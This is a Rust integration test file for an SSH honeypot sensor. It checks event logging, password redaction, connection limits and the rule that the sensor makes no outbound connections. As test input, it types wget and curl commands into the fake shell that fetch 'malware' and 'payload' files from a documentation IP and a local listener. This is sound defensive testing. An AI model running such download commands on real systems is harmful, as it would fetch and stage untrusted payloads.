//! Real-client integration tests (Task 14): connects a russh SSH client to this crate's own
//! SSH honeypot and verifies events, protocol correctness, and the no-outbound-connection
//! guarantee end to end. These tests exercise the full stack: TCP, version exchange, key
//! exchange, encrypted transport, user authentication, channel management, and shell/transfer
//! data flow.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use sensor_framework::{ConnectionBounds, WanResolver};

/// Bounds for a test server: production's shape, with a `max_duration` long enough that no test
/// here can be cut off by it. Deliberately not tiny - a too-short duration would make these tests
/// fail intermittently under load for a reason unrelated to what they assert.
fn test_bounds() -> ConnectionBounds {
    ConnectionBounds {
        read_timeout: Duration::from_secs(30),
        idle_timeout: Duration::from_secs(60),
        max_duration: Duration::from_secs(120),
        max_captured_bytes: 1_000_000,
        max_concurrent: 64,
    }
}

/// Minimal russh client handler that accepts any host key (this is a test against our own
/// honeypot, not a connection to a third party).
struct TestHandler;

impl russh::client::Handler for TestHandler {
    type Error = russh::Error;

    async fn check_server_key(
        &mut self,
        _key: &russh::keys::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

#[tokio::test]
async fn ssh_handshake_and_session_with_real_client() {
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("events.jsonl");
    let spool_dir = dir.path().join("spool");
    let host_key_path = dir.path().join("host_key");

    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        log_path.clone(),
        spool_dir,
        host_key_path,
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
    )
    .await
    .unwrap();

    // Connect with russh client.
    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();

    // Authenticate.
    let auth_result = session
        .authenticate_password("attacker", "password123")
        .await
        .unwrap();
    assert!(
        auth_result.success(),
        "authentication must succeed (accept-all)"
    );

    // Open a channel and request a shell.
    let channel = session.channel_open_session().await.unwrap();
    channel
        .request_pty(false, "xterm", 80, 24, 0, 0, &[])
        .await
        .unwrap();
    channel.request_shell(false).await.unwrap();

    // Give the server time to send the initial prompt.
    tokio::time::sleep(Duration::from_millis(200)).await;

    // Type commands.
    channel.data(&b"uname -a\n"[..]).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    channel
        .data(&b"wget http://203.0.113.99/malware\n"[..])
        .await
        .unwrap();

    // Give the server time to process and emit events.
    tokio::time::sleep(Duration::from_millis(500)).await;
    channel.eof().await.unwrap();
    drop(channel);
    drop(session);
    tokio::time::sleep(Duration::from_millis(200)).await;
    handle.abort();

    // Read and verify events.
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    let events: Vec<sensor_wire::SensorEvent> = content
        .lines()
        .map(|l| serde_json::from_str(l).unwrap())
        .collect();

    let signal_types: Vec<&str> = events.iter().map(|e| e.signal_type.as_str()).collect();
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_CONNECTION),
        "missing honeypot_connection event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT),
        "missing honeypot_login_attempt event; got: {signal_types:?}"
    );
    assert!(
        signal_types.contains(&sensor_wire::SIGNAL_HONEYPOT_COMMAND_EXEC),
        "missing honeypot_command_exec event; got: {signal_types:?}"
    );

    // Verify protocol_label = "ssh" on all events.
    for event in &events {
        let label = event
            .metadata
            .get("protocol_label")
            .and_then(|v| v.as_str());
        assert_eq!(label, Some("ssh"), "protocol_label must be 'ssh'");
    }

    // Verify protocol = "tcp" on all events.
    for event in &events {
        assert_eq!(event.protocol, sensor_wire::PROTO_TCP);
    }

    // Verify authenticated semantics.
    let conn_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_CONNECTION)
        .unwrap();
    assert!(!conn_event.authenticated);
    let login_event = events
        .iter()
        .find(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_LOGIN_ATTEMPT)
        .unwrap();
    assert!(login_event.authenticated);

    // PII discipline: password must not appear in any event.
    let all_json = serde_json::to_string(&events).unwrap();
    assert!(
        !all_json.contains("password123"),
        "password must never appear in events"
    );
}

#[tokio::test]
async fn no_outbound_connections() {
    // Start a "target" server that the fake wget/curl would connect to if it actually made
    // network requests. Verify it receives zero connections.
    let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let target_addr = target_listener.local_addr().unwrap();
    let connection_count = std::sync::Arc::new(std::sync::atomic::AtomicU32::new(0));
    let count = connection_count.clone();
    let target_task = tokio::spawn(async move {
        loop {
            if let Ok((_stream, _addr)) = target_listener.accept().await {
                count.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }
    });

    let dir = tempfile::tempdir().unwrap();
    let spool_dir = dir.path().join("spool");
    let wan_resolver = Arc::new(WanResolver::new(HashMap::new()));
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        spool_dir,
        dir.path().join("host_key"),
        wan_resolver,
        test_bounds(),
        "OpenSSH_9.6p1".to_string(),
    )
    .await
    .unwrap();

    let config = Arc::new(russh::client::Config::default());
    let mut session = russh::client::connect(config, addr, TestHandler)
        .await
        .unwrap();
    session.authenticate_password("root", "pass").await.unwrap();
    let channel = session.channel_open_session().await.unwrap();
    channel.request_shell(false).await.unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;

    let cmd = format!("wget http://127.0.0.1:{}/malware.bin\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();
    let cmd = format!("curl http://127.0.0.1:{}/payload\n", target_addr.port());
    channel.data(cmd.as_bytes()).await.unwrap();

    tokio::time::sleep(Duration::from_secs(1)).await;
    drop(channel);
    drop(session);
    handle.abort();
    target_task.abort();

    assert_eq!(
        connection_count.load(std::sync::atomic::Ordering::Relaxed),
        0,
        "sensor must open ZERO outbound connections"
    );
}

// ---------------------------------------------------------------------
// Connection bounds
//
// This sensor hand-rolled its own accept loop and so had none of the framework bounds every
// other sensor gets: no concurrency cap, no session-duration cap, and a bare `continue` on
// accept errors. Nothing in the session path imposes a deadline either - every phase awaits a
// socket read with no timeout - so a peer that connected and then went quiet held its connection,
// and its descriptor, forever. Verified against the live sensor before the fix: a connection left
// idle after KEXINIT was still open 75 seconds later.
//
// Both tests below fail against that old loop, which is the point of them.
// ---------------------------------------------------------------------

/// A silent peer must be disconnected once `max_duration` elapses.
#[tokio::test]
async fn an_idle_session_is_dropped_once_max_duration_elapses() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        max_duration: Duration::from_secs(1),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
    )
    .await
    .unwrap();

    // Connect and then say nothing at all - the shape that used to leak a descriptor per peer.
    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();

    // The server greets first, so drain whatever it sends before waiting for the close.
    let mut scratch = [0u8; 1024];
    let closed = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            match stream.read(&mut scratch).await {
                Ok(0) => return true,  // FIN: the session was dropped, as it must be
                Ok(_) => continue,     // banner/KEXINIT; keep waiting
                Err(_) => return true, // reset also counts as disconnected
            }
        }
    })
    .await;

    handle.abort();
    assert_eq!(
        closed,
        Ok(true),
        "an idle session must be dropped once max_duration elapses, not held indefinitely"
    );
}

/// Beyond `max_concurrent`, further connections are refused immediately rather than queued -
/// an accepted-but-waiting connection is itself the unbounded resource the cap exists to prevent.
#[tokio::test]
async fn concurrency_beyond_max_concurrent_is_refused_not_queued() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        max_concurrent: 1,
        max_duration: Duration::from_secs(30),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
    )
    .await
    .unwrap();

    // First connection takes the only permit and holds it by staying silent.
    let mut first = tokio::net::TcpStream::connect(addr).await.unwrap();
    let mut scratch = [0u8; 1024];
    let _ = tokio::time::timeout(Duration::from_secs(5), first.read(&mut scratch)).await;

    // Second connection: accepted at the TCP layer, then closed without a byte of SSH.
    let mut second = tokio::net::TcpStream::connect(addr).await.unwrap();
    let got = tokio::time::timeout(Duration::from_secs(10), second.read(&mut scratch)).await;

    handle.abort();
    match got {
        Ok(Ok(0)) | Ok(Err(_)) => {}
        Ok(Ok(n)) => panic!("second connection got {n} bytes; the cap did not apply"),
        Err(_) => panic!("second connection was left hanging - queued, not refused"),
    }
}

/// A peer that connects mid-handshake and then goes quiet must be dropped at the READ timeout,
/// not held until `max_duration`.
///
/// `max_duration` is set to 60s here deliberately, far beyond the 15s deadline below: if this
/// passes, the close can only have come from the per-read timeout, so the assertion cannot be
/// satisfied by the session cap that already existed. Before the per-read bound, a peer could hold
/// a connection slot for the full 600s default this way, for the cost of one TCP handshake.
#[tokio::test]
async fn a_peer_that_stalls_mid_handshake_is_dropped_at_the_read_timeout() {
    use tokio::io::AsyncReadExt;

    let dir = tempfile::tempdir().unwrap();
    let bounds = ConnectionBounds {
        read_timeout: Duration::from_secs(1),
        idle_timeout: Duration::from_secs(1),
        max_duration: Duration::from_secs(60),
        ..test_bounds()
    };
    let (addr, handle) = sensor_ssh::serve(
        "127.0.0.1:0".parse().unwrap(),
        dir.path().join("events.jsonl"),
        dir.path().join("spool"),
        dir.path().join("host_key"),
        Arc::new(WanResolver::new(HashMap::new())),
        bounds,
        "OpenSSH_9.6p1".to_string(),
    )
    .await
    .unwrap();

    let mut stream = tokio::net::TcpStream::connect(addr).await.unwrap();
    // Send a valid client identification so the server proceeds into key exchange, then stop.
    // This is the shape that used to cost nothing to hold: past the accept, never completing.
    use tokio::io::AsyncWriteExt;
    stream
        .write_all(b"SSH-2.0-StalledClient\r\n")
        .await
        .unwrap();

    let mut scratch = [0u8; 4096];
    let closed = tokio::time::timeout(Duration::from_secs(15), async {
        loop {
            match stream.read(&mut scratch).await {
                Ok(0) => return true,
                Ok(_) => continue, // banner + KEXINIT; keep waiting for the close
                Err(_) => return true,
            }
        }
    })
    .await;

    handle.abort();
    assert_eq!(
        closed,
        Ok(true),
        "a stalled handshake must be dropped at the read timeout, well before max_duration"
    );
}
